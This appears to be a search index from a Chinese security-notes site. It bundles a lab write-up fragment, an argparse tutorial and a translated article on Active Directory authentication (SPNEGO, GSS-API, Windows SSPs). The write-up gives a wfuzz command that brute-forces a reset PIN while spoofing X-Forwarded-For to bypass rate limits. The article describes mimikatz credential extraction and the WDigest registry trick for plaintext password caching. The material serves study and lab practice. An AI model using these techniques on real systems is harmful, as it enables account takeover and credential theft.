\u83b7\u53d6root\u6743\u9650</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Altered/#_3","title":"\u4e3b\u673a\u4fe1\u606f","text":"<p>\u5f00\u653e\u7aef\u53e3 22 80</p> \u64cd\u4f5c\u7cfb\u7edf Ubuntu \u4e2d\u95f4\u4ef6 Nginx/1.18.0 \u811a\u672c\u8bed\u8a00 PHP \u5f00\u53d1\u6846\u67b6 Laravel Cookie XSRF-TOKEN,laravel_session"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Altered/#_4","title":"\u767b\u5f55\u9875\u9762","text":"<p>\u5c1d\u8bd5\u5931\u8d25\u540e\u51fa\u73b0\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u3002</p> <p>\u7206\u7834\u5bc6\u7801\u91cd\u7f6epin\u7801</p> <p>\u200b   \u7ed5\u8fc7\u8bf7\u6c42\u9650\u5236 XFF\u5934</p> <p>\u200b   <code>$wfuzz -u 'http://10.129.135.195/api/resettoken' -X POST -d 'name=admin&amp;pin=FUZ2Z' -w ipa.txt -z range,0000-9999 -t 50 -H 'X-Forwarded-For: 127.2.FUZZ' -m zip -p 127.0.0.1:8080</code></p> <p>\u767b\u5f55\u540e\u53f0</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Argparse%E6%95%99%E7%A8%8B/","title":"Argparse\u6559\u7a0b","text":"<p>Argparse\u6559\u7a0b</p> <p>\u6982\u5ff5</p> <pre><code>$ ls\n\u4e0d\u5e26\u53c2\u6570\u72ec\u7acb\u8fd0\u884c\u547d\u4ee4\n$ ls pypy\n\u643a\u5e26'pypy'\u88ab\u79f0\u4e3a\u4f4d\u7f6e\u53c2\u6570\n$ ls -l\n\u643a\u5e26'-l'\u88ab\u79f0\u4e3a\u53ef\u9009\u53c2\u6570\n$ ls --help\n'--help' \u67e5\u770b\u5e2e\u52a9\u6587\u6863\n...\n</code></pre> <p>\u57fa\u7840</p> <pre><code>import argparse\n\nparser = argparse.ArgumentParser()\nparser.parse_args()\n</code></pre> <pre><code>$ python3 prog.py\n$ python3 prog.py --help\nusage: prog.py [-h]     //\u672a\u6dfb\u52a0\u4efb\u4f55\u53c2\u6570\uff0c\u9ed8\u8ba4\u542bhelp\u9009\u9879\n\noptional arguments:\n  -h, --help  show this help message and exit\n$ python3 prog.py --verbose\nusage: prog.py [-h]\nprog.py: error: unrecognized arguments: --verbose\n$ python3 prog.py foo\nusage: prog.py [-h]\nprog.py: error: unrecognized arguments: foo\n</code></pre> <p>\u4f4d\u7f6e\u53c2\u6570\u4ecb\u7ecd</p> <pre><code>//echo.py\nimport argparse\nparser = argparse.ArgumentParser()\nparser.add_argument(\"echo\", help=\"echo the string you use here\")        //help\u5e2e\u52a9\u4fe1\u606f\nprint(args.echo)\n\n//prog.py\nimport argparse\nparser.add_argument(\"square\", help=\"display a square of a given number\", type=int)  //type\u6307\u5b9a\u7c7b\u578b\nargs = parser.parse_args()\nprint(args.square**2)\n</code></pre> <p>\u53ef\u9009\u53c2\u6570\u4ecb\u7ecd</p> <pre><code>import argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-v\", \"--verbosity\", help=\"increase output verbosity\", action=\"store_true\")     \n//\u6dfb\u52a0'store_true'\u9ed8\u8ba4\u4e3atrue\nargs = parser.parse_args()\nif args.verbosity:      //\u53c2\u6570\u6ca1\u6709\u6307\u5b9a\uff0c\u53d8\u91cf\u503c\u4e3aNone\n    print(\"verbosity turned on\")\n</code></pre> <p>\u7ed3\u5408\u4f4d\u7f6e\u53c2\u6570\u548c\u53ef\u9009\u53c2\u6570</p> <pre><code>import argparse\nparser = argparse.ArgumentParser()\nparser.add_argument(\"square\", type=int,\n                    help=\"display the square of a given number\")\nparser.add_argument(\"-v\", \"--verbosity\", action=\"count\",\n                    help=\"increase output verbosity\")\nargs = parser.parse_args()\nanswer = args.square**2\nif args.verbosity == 2:\n    print(\"the square of {} equals {}\".format(args.square, answer))\nelif args.verbosity == 1:\n    print(\"{}^2 == {}\".format(args.square, answer))\nelse:\n    print(answer)\n</code></pre> <pre><code>https://10.0.0.65:888/cgi/maincgi.cgi?Url=HostObj&amp;Act=Add\"\n\nCookie:\n\nPOST\ndef_host_name=  &amp;def_host_ipad= &amp;def_host_ipad= &amp;def_host_ipad=\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/","title":"Attacking Active Directory 0 to 0.9\uff08\u8bd1\u6587\uff0c\u4e0b\u7bc7\uff09","text":"<p>\u5728\u672c\u6587\u4e2d\uff0c\u6211\u4eec\u5c06\u7ee7\u7eed\u4e3a\u8bfb\u8005\u4ecb\u7ecd\u4e0eActive Directory\u76f8\u5173\u7684\u653b\u9632\u77e5\u8bc6\u3002</p> <p>\uff08\u63a5\u4e0a\u6587\uff09</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#authentication","title":"Authentication","text":"<p>\u7406\u89e3\u5404\u79cdActive Directory\u653b\u51fb\u65f6\u7684\u4e00\u4e2a\u5173\u952e\uff0c\u5c31\u662f\u7406\u89e3\u8eab\u4efd\u9a8c\u8bc1\u5728Active Directory\u4e2d\u662f\u5982\u4f55\u8fdb\u884c\u7684\u3002\u4f46\u5728\u6df1\u5165\u4ecb\u7ecd\u6280\u672f\u7ec6\u8282\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u5feb\u901f\u603b\u7ed3\u4e00\u4e0b\u3002</p> <p>\u5728Active Directory\u4e2d\uff0c\u6709\u4e24\u79cd\u53ef\u7528\u7684\u7f51\u7edc\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff1aNTLM\u548cKerberos\u534f\u8bae\u3002\u5b83\u4eec\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\uff0c\u90fd\u53ef\u5bf9\u57df\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800cKerberos\u662f\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u9996\u9009\u9879\uff0c\u4f46\u662f\u53ea\u6709NTLM\u53ef\u7528\u4e8e\u5bf9\u672c\u5730\u8ba1\u7b97\u673a\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</p> <p>\u65e2\u7136\u5b83\u4eec\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u90a3\u4e48\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u662f\u5982\u4f55\u5c31\u8981\u4f7f\u7528\u7684\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u8fbe\u6210\u4e00\u81f4\u7684\uff1f\u5b9e\u9645\u4e0a\uff0c\u5b83\u4eec\u4f7f\u7528\u4e86\u4e00\u79cd\u53eb\u505aSPNEGO\u7684\u534f\u5546\u673a\u5236\u3002\u901a\u8fc7SPNEGO\u673a\u5236\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u6307\u51fa\u81ea\u5df1\u53ef\u4ee5\u63a5\u53d7\u54ea\u79cd\u534f\u8bae\u3002</p> <p></p> <p>SPNEGO\u534f\u5546</p> <p>\u4f7f\u7528SPNEGO\u8fdb\u884c\u534f\u5546\u7684\u534f\u8bae\uff0c\u5fc5\u987b\u4e0eGSS-API\u7f16\u7a0b\u63a5\u53e3\u76f8\u4e92\u517c\u5bb9\uff0c\u4ee5\u4fbf\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7a0b\u5e8f\u80fd\u591f\u4ee5\u900f\u660e\u7684\u65b9\u5f0f\u4f7f\u7528\u5b83\u4eec\u3002</p> <p>\u4f46\u662f\uff0c\u6211\u4eec\u8fd8\u5fc5\u987b\u8003\u8651\u5230\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u4e0d\u4ec5\u8981\u9002\u7528\u4e8e\u8fdc\u7a0b\u767b\u5f55\uff0c\u8fd8\u8981\u9002\u7528\u4e8e\u672c\u5730\u767b\u5f55\uff0c\u56e0\u4e3a\u8ba1\u7b97\u673a\u9700\u8981\u6839\u636e\u57df\u63a7\u5236\u5668\u5bf9\u57df\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff08\u901a\u5e38\u901a\u8fc7\u8be2\u95eeKerberos\u7968\u8bc1\u5b8c\u6210\u9a8c\u8bc1\uff09\u3002Windows\u8ba1\u7b97\u673a\u4e2d\u63d0\u4f9b\u4e86\u4e0d\u540c\u7684\u767b\u5f55\u7c7b\u578b\uff0c\u56e0\u6b64\uff0c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u719f\u6089\u8fd9\u4e9b\u7c7b\u578b\uff0c\u56e0\u4e3a\u5176\u4e2d\u67d0\u4e9b\u7c7b\u578b\u4f1a\u628a\u7528\u6237\u51ed\u636e\u7f13\u5b58\u5728lsass\u8fdb\u7a0b\u4e2d\uff0c\u6216\u8005\u5c06\u5bc6\u7801\u5b58\u50a8\u5728LSA\u673a\u5bc6\u4e2d\u3002</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u4e0d\u59a8\u5148\u6765\u56de\u987e\u4e00\u4e0b\u8fd9\u4e9b\u767b\u9646\u7c7b\u578b\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#gss-apisspi","title":"GSS-API/SSPI","text":"<p>GSS-API\uff08Generic Security Service Application Program Interface\uff0cGSS-API\uff09\u662f\u4e00\u79cd\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff0c\u5b9a\u4e49\u4e86\u53ef\u4ee5\u7531\u5b89\u5168\u5305\u5b9e\u73b0\u7684\u8fc7\u7a0b\u548c\u7c7b\u578b\uff0c\u4ee5\u4fbf\u4ee5\u7edf\u4e00\u7684\u65b9\u5f0f\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\uff08\u800c\u4e0d\u662f\u6388\u6743\uff09\u3002GSS-API\u7684\u5177\u4f53\u5b9a\u4e49\u89c1RFC2743\u3002</p> <p>\u5728RFC2744\u4e2d\u5b9a\u4e49\u4e86\u57fa\u4e8eC\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7684\u8fc7\u7a0b\u548c\u7c7b\u578b\u3002\u56e0\u6b64\uff0c\u4e0eGSS-API\u517c\u5bb9\u7684\u5e93\u4e5f\u9700\u8981\u5b9e\u73b0\u8fd9\u4e9b\u65b9\u6cd5\u548c\u7c7b\u578b\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528GSS-API\u8fc7\u7a0b\u800c\u4e0d\u662f\u76f4\u63a5\u8c03\u7528Kerberos\u8fc7\u7a0b\u6765\u4f7f\u7528MIT Kerberos\u5e93\u3002\u4e0b\u9762\u7ed9\u51fa\u90e8\u5206GSS-API\u8fc7\u7a0b\uff1a</p> <ul> <li>gss_acquire_cred:\u8fd4\u56de\u51ed\u636e\u53e5\u67c4\u3002</li> <li>gss_init_sec_context:\u542f\u52a8\u4e0e\u5bf9\u7b49\u65b9\u4e00\u8d77\u4f7f\u7528\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\u3002</li> <li>gss_accept_sec_context:\u63a5\u53d7\u7531\u5bf9\u7b49\u65b9\u53d1\u8d77\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\u3002</li> </ul> <p>\u6b64\u5916\uff0cGSS-API\u8fd8\u6709\u52a9\u4e8e\u7ef4\u62a4\u901a\u4fe1\u7684\u5b8c\u6574\u6027\u548c\u673a\u5bc6\u6027\u3002GSS-API\u8fd8\u63d0\u4f9b\u4e86\u8ba1\u7b97/\u9a8c\u8bc1\u6d88\u606f\u7684MIC\uff08\u6d88\u606f\u5b8c\u6574\u6027\u4ee3\u7801\uff09\u4ee5\u53ca\u52a0\u5bc6/\u89e3\u5bc6\u5185\u5bb9\u7684\u8fc7\u7a0b\u3002\u4e0b\u9762\u7ed9\u51fa\u5176\u4e2d\u7684\u90e8\u5206\u8fc7\u7a0b\uff1a</p> <ul> <li>gss_get_mic:\u8ba1\u7b97\u6d88\u606f\u7684MIC\uff08\u6d88\u606f\u5b8c\u6574\u6027\u4ee3\u7801\uff09\u3002</li> <li>gss_verify_mic:\u68c0\u67e5MIC\u4ee5\u9a8c\u8bc1\u6d88\u606f\u5b8c\u6574\u6027\u3002</li> <li>gss_wrap:\u5c06MIC\u9644\u52a0\u5230\u6d88\u606f\u4e0a\uff0c\u5e76\u53ef\u9009\u5730\u52a0\u5bc6\u6d88\u606f\u5185\u5bb9\u3002</li> <li>gss_unwrap:\u9a8c\u8bc1MIC\u5e76\u89e3\u5bc6\u6d88\u606f\u5185\u5bb9\u3002</li> <li>\u8fd9\u6837\uff0c\u7528\u6237\u5e94\u7528\u7a0b\u5e8f\u53ea\u9700\u8c03\u7528GSS-API\u8fc7\u7a0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u7684\u5b89\u5168\u5e93\uff0c\u800c\u65e0\u9700\u9488\u5bf9\u6bcf\u4e2a\u5e93\u4fee\u6539\u4ee3\u7801\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7GSS-API\u540c\u65f6\u4f7f\u7528Kerberos\u548cNTLM\u8eab\u4efd\u9a8c\u8bc1\u3002<pre><code>             `.---------------------------.                      |   Kerberos Library        |                      .---            .----       |                .---&gt; | GSS-API  ---&gt; | Kerberos  |                |     '---            '----       |                |     |                           |  .---------.   |     '---------------------------'  |  user   |---|  | program |   |     .---------------------------.  '---------'   |     |       NTLM  Library       |                |     .---            .----       |                '---&gt; | GSS-API  ---&gt; | NTLM      |                      '---            '----       |                      |                           |                      '---------------------------'`\n</code></pre> </li> </ul> <p>\u53ef\u4ee5\u540c\u65f6\u4f7f\u7528Kerberos\u6216NTLM\u8eab\u4efd\u9a8c\u8bc1\u7684\u7a0b\u5e8f</p> <p>Windows\u4e2d\u7684\u8bb8\u591a\u670d\u52a1\u90fd\u4f1a\u7528\u5230GSS-API\uff0c\u4ee5\u4fbf\u901a\u8fc7Kerberos\u6216NTLM\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\u3002\u5c3d\u7ba1\u5982\u6b64\uff0cKerberos\u4ecd\u7136\u4e0d\u80fd\u5728\u5de5\u4f5c\u7ec4\u4e2d\u4f7f\u7528\uff0c\u53ea\u80fd\u5728Active Directory\u4e2d\u4f7f\u7528\uff0c\u56e0\u4e3a\u5b83\u662f\u4e00\u79cd\u96c6\u4e2d\u5f0f\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u3002</p> <p>Windows\u8fd8\u4f1a\u4f7f\u7528SSPI\uff08Security Support Provider Interface)\uff0c\u8fd9\u662fGSS-API\u7684Microsoft\u4e13\u7528\u7248\u672c\uff0c\u5e76\u8fdb\u884c\u4e86\u67d0\u4e9b\u6269\u5c55\u3002\u4e8b\u5b9e\u4e0a\uff0cSSPI\u7684\u8bb8\u591a\u51fd\u6570\u4e0eGSS-API\u51fd\u6570\u662f\u7b49\u6548\u7684\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <p></p> <p>SSPI\u4e0eGSS-API\u4e4b\u95f4\u7684\u7b49\u6548\u51fd\u6570</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#windows-ssps","title":"Windows SSPs","text":"<p>\u5728Windows\u4e2d\uff0c\u6709\u8bb8\u591a\u4e0d\u540c\u7684SSP\uff08Security Support Provider\uff09\u90fd\u4ee5DLL\u5e93\u7684\u5f62\u5f0f\u5b9e\u73b0\u4e86SSPI\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f9b\u5404\u79cd\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e9b\u5e38\u89c1\u7684SSP\uff1a</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-ssp","title":"Kerberos SSP","text":"<p>Kerberos SSP\uff08Kerberos.dll\uff09\u4e3b\u8981\u7528\u4e8e\u7ba1\u7406Kerberos\u8eab\u4efd\u9a8c\u8bc1\uff0c\u540c\u65f6\uff0c\u5b83\u8fd8\u8d1f\u8d23\u7f13\u5b58Kerberos\u7968\u8bc1\u548c\u5bc6\u94a5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-ssp","title":"NTLM SSP","text":"<p>NTLMSSP\uff08msv1_0.dll\uff09\u4e3b\u8981\u7528\u4e8e\u7ba1\u7406NTLM\u8eab\u4efd\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u5b83\u8fd8\u8d1f\u8d23\u7f13\u5b58mimikatz\u53ef\u4ee5\u4ecelsass\u8fdb\u7a0b\u63d0\u53d6\u7684NT\u54c8\u5e0c\u503c\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#negotiate-ssp","title":"Negotiate SSP","text":"<p>Negotiate SSP\uff08Secur32.dll\uff09\u662f\u7ba1\u7406SPNEGO\u534f\u5546\u7684\u4e2d\u95f4SSP\uff0c\u5e76\u6839\u636e\u534f\u5546\u7ed3\u679c\u5c06\u8eab\u4efd\u9a8c\u8bc1\u59d4\u6d3e\u7ed9Kerberos SSP\u6216NTLM SSP\u3002</p> <pre><code>                                         `Kerberos                                          .-------------------------.                                          |      kerberos.dll       |                                          |-------------------------|                                          .---           .----      |                    Negotiate       .---&gt; | GSS-API ---&gt; | Kerberos |                  .-------------.   |     '---           '----      |                  | secur32.dll |   |     |                         |                  |-------------|   |     '-------------------------'  .---------.     .---          |   |  |  user   |----&gt;| GSS-API ----|&gt;--|  | program |     '---          |   |         NTLM  '---------'     |             |   |     .-------------------------.                  '-------------'   |     |       msv1_0.dll        |                                    |     |-------------------------|                                    |     .---           .----      |                                    '---&gt; | GSS-API ---&gt; | NTLM     |                                          '---           '----      |                                          |                         |                                          '-------------------------'`\n</code></pre> <p>\u4f7f\u7528Negotiate\uff08SPNEGO\uff09\u7684\u7a0b\u5e8f</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#digest-ssp","title":"Digest SSP","text":"<p>Digest\uff08wdigest.dll\uff09\u5b9e\u73b0\u4e86\u7528\u4e8eHTTP\u7684Digest Access\u534f\u8bae\u3002\u5b83\u662f\u65e7\u7248\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7f13\u5b58\u660e\u6587\u5bc6\u7801\u7684SSP\uff0c\u53ef\u4ee5\u901a\u8fc7mimikatz\u8fdb\u884c\u68c0\u7d22\u3002</p> <p>\u5373\u4f7f\u4eceWindows 2008 R2\u5f00\u59cb\u9ed8\u8ba4\u7981\u7528\u4e86\u5bc6\u7801\u7f13\u5b58\uff0c\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u5c06HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\u6ce8\u518c\u8868\u9879\u8bbe\u7f6e\u4e3a1\u6216\u76f4\u63a5\u5728\u5185\u5b58\u4e2d\u4fee\u8865Digest SSP\u6765\u542f\u7528\u5bc6\u7801\u7f13\u5b58\u529f\u80fd\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#secure-channel-ssp","title":"Secure Channel SSP","text":"<p>Secure Channel\uff08schannel.dll\uff09\u53ef\u4ee5\u63d0\u4f9b\u52a0\u5bc6\u7684\u901a\u4fe1\u3002\u5b83\u88ab\u7528\u6765\u4e3aHTTP\u901a\u4fe1\u6dfb\u52a0SSL/TLS\u5c42\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#cred-ssp","title":"Cred SSP","text":"<p>CredSSP\uff08credssp.dll\uff09\u521b\u5efa\u4e00\u4e2aTLS\u901a\u9053\uff0c\u901a\u8fc7\u534f\u5546\u578bSSP\u5bf9\u5ba2\u6237\u7aef\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u6700\u540e\u5141\u8bb8\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u7528\u6237\u7684\u5b8c\u6574\u51ed\u636e\u3002RDP\u5c06\u4f1a\u7528\u5230\u5b83\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#custom-ssps","title":"Custom SSPs","text":"<p>\u6b64\u5916\uff0c\u7b2c\u4e09\u65b9\u4e5f\u53ef\u4ee5\u5728\u6ce8\u518c\u8868\u9879hklm\\system\\currentcontrolset\\control\\lsa\\security packages\u4e2d\u6dfb\u52a0\u81ea\u5df1\u7684\u81ea\u5b9a\u4e49SSP\u3002SSP\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2aAP\uff08\u8eab\u4efd\u9a8c\u8bc1\u5305\uff09\uff0c\u4f9b\u767b\u5f55\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u3002\u5b9e\u9645\u4e0a\uff0c\u6ce8\u518cSSP/AP\u6b63\u662fmimikatz\u7528\u6765\u7a83\u53d6\u5bc6\u7801\u7684\u4e00\u79cd\u6280\u672f\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#spnego","title":"SPNEGO","text":"<p>SPNEGO\uff08Simple and Protected GSS-API Negotiation\uff09\u662f\u4e00\u79cd\u673a\u5236\uff0c\u5141\u8bb8\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\u534f\u5546\u5e95\u5c42\u5b89\u5168\u534f\u8bae\uff0c\u5373\u4e0eGSS-API\u517c\u5bb9\u7684\u534f\u8bae\uff0c\u4ee5\u4f9b\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u3002\u8fd9\u6837\uff0c\u5ba2\u6237\u7aef\uff08\u5728RFC 4178\u4e2d\u4e5f\u88ab\u79f0\u4e3a\u53d1\u8d77\u65b9\uff09\u548c\u670d\u52a1\u5668\uff08\u88ab\u79f0\u4e3a\u63a5\u53d7\u65b9\uff09\u5c31\u90fd\u53ef\u4ee5\uff08\u901a\u8fc7\u8c03\u7528GSS_Init_sec_context\uff09\u5efa\u7acb\u76f8\u540c\u7684GSS\u4e0a\u4e0b\u6587\u4e86\u3002</p> <p>SPNEGO\u7684\u5904\u7406\u8fc7\u7a0b\u5927\u4f53\u5982\u4e0b\u6240\u793a\uff1a</p> <ol> <li> <p>\u5ba2\u6237\u7aef\uff08\u53d1\u8d77\u65b9\uff09\u8c03\u7528GSS_Init_sec_context\u5e76\u6307\u51fa\u5c06\u4f7f\u7528SPNEGO\u3002\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5b89\u5168\u673a\u5236\u9009\u9879\u7684\u5217\u8868\uff08mechTypes\uff09\uff0c\u4ee5\u53ca\u4e00\u4e2a\u9996\u9009\u673a\u5236\u7684\u521d\u59cb\u4ee4\u724c\uff08mechToken\uff09\u2014\u2014\u8be5\u4ee4\u724c\u662f\u53ef\u9009\u9879\u3002\u8fd9\u4e9b\u4fe1\u606f\u5c06\u901a\u8fc7NegTokenInit\u6d88\u606f\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff08\u63a5\u53d7\u65b9\uff09\u3002</p> <p></p> <p>\u5e26\u6709Kerberos\u521d\u59cb\u4ee4\u724c\u7684SPNEGO NegTokenInit</p> </li> <li> <p>\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\u5c06\u521d\u59cb\u4ee4\u724c\u548c\u5b89\u5168\u673a\u5236\u5217\u8868\u4f20\u9012\u7ed9GSS_Accept_sec_context\u3002\u7136\u540e\u8fd4\u56de\u4ee5\u4e0b\u7ed3\u679c\u4e4b\u4e00\uff0c\u5e76\u901a\u8fc7NegTokenResp\u6d88\u606f\u8fdb\u884c\u53d1\u9001\uff08NegTokenResp\u4e0eWireshark\u663e\u793a\u7684NegTokenTarg\u76f8\u540c\uff09\u3002</p> </li> <li> <p>\u6ca1\u6709\u4e00\u4e2a\u5b89\u5168\u673a\u5236\u88ab\u63a5\u53d7\u65f6\uff0c\u670d\u52a1\u5668\u5c06\u62d2\u7edd\u8be5\u534f\u5546\u3002</p> </li> <li>\u5982\u679c\u6240\u9009\u62e9\u7684\u5b89\u5168\u673a\u5236\u662f\u5ba2\u6237\u7aef\u7684\u9996\u9009\uff0c\u5219\u76f4\u63a5\u4f7f\u7528\u6536\u5230\u7684\u4ee4\u724c\u3002\u540c\u65f6\uff0c\u8fd8\u5c06\u521b\u5efa\u4e00\u4e2a\u5305\u542baccept-complete\u72b6\u6001\u7684\u534f\u5546\u4ee4\u724c\u3002</li> <li>\u5982\u679c\u9009\u62e9\u4e86\u9996\u9009\u673a\u5236\u4ee5\u5916\u7684\u5176\u4ed6\u673a\u5236\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u5305\u542baccept-complete\u72b6\u6001\u6216request-mic\u72b6\u6001\u7684\u534f\u5546\u4ee4\u724c\u3002</li> </ol> <p></p> <p>\u8fd4\u56deaccept-complete\u72b6\u6001\u7684SPNEGO NegTokenResp</p> <ol> <li>\u534f\u5546\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u540e\uff0c\u4f1a\u5c06\u5176\u4f20\u9012\u7ed9GSS_Init_sec_context\u5e76\u5bf9\u5176\u8fdb\u884c\u5206\u6790\u3002\u534f\u5546\u8fc7\u7a0b\u5c06\u6301\u7eed\u4e0b\u53bb\uff0c\u76f4\u5230\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u53cc\u65b9\u5728\u5b89\u5168\u673a\u5236\u548c\u9009\u9879\u4e0a\u8fbe\u6210\u4e00\u81f4\u4e3a\u6b62\u3002<pre><code>                             `Client              Server                                         |                 |  GSS_Init_sec_context(SPNEGO=True) &lt;--- |                 |                                    ---&gt; |   NegTokenInit  |                             1) Kerberos | --------------&gt; |                                  (Token)  |    Security?    |                               2) NTLM     |    1) Kerberos  |                                         |       (Token)   |                                         |    2) NTLM      | Kerberos (Token)                                         |                 | ---&gt; GSS_Accept_sec_context()                                         |   NegTokenResp  | &lt;---                                         | &lt;-------------- | (Token)                                         |     (Token)     | accept-complete                                   Token | accept-complete |             GSS_Init_sec_context() &lt;--- |                 |                                          |                 |                                         |                 |`\n</code></pre> </li> </ol> <p>SPNEGO\u534f\u5546\u8fc7\u7a0b</p> <p>Windows\u662f\u901a\u8fc7Negotiate SSP\u6765\u4f7f\u7528SPNEGO\u7684\u3002\u8fd9\u4e48\u505a\u7684\u597d\u5904\uff0c\u5c31\u662f\u5141\u8bb8\u50cfSMB\u8fd9\u6837\u7684\u670d\u52a1\u4e5f\u80fd\u4f7f\u7528Kerberos\u6216NTLM\u8eab\u4efd\u9a8c\u8bc1\u3002Kerberos\u4e3b\u8981\u7528\u4e8e\u5bf9\u57df\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800cNTLM\u5219\u7528\u4e8e\u5bf9\u672c\u5730\u8ba1\u7b97\u673a\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd8\u6709\u4e00\u4e2a\u540d\u4e3aNEGOEX\u7684\u9009\u9879\uff0c\u7528\u4e8e\u6269\u5c55SPNEGO\u9009\u9879\uff0c\u4f46\u6211\u4f3c\u4e4e\u4ece\u672a\u4f7f\u7528\u8fc7\u8fd9\u4e2a\u9009\u9879\u3002</p> 